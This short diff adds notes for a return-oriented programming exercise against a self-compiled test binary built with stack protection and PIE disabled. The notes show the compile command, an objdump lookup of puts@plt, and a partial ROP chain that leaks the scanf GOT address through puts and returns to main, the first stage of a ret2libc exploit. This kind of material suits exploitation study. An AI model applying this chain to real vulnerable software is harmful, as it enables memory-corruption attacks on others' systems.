@@ -1,0 +1,10 @@
+gcc testrop.c -fno-stack-protector -no-pie -m32 -o testrop
+
+objdump -d testrop | grep "<puts@plt>"
+
+
+pr = 0x0804901e  #: pop ebx ; ret
+gotscanf = b.symbols['got.__isoc99_scanf'] # 0x804975c
+pltputs = b.symbols['puts'] # 0x8048310 
+
+ropchain=padding+p32(pltputs)+p32(pr)+p32(gotscanf)+p32(addrmain)
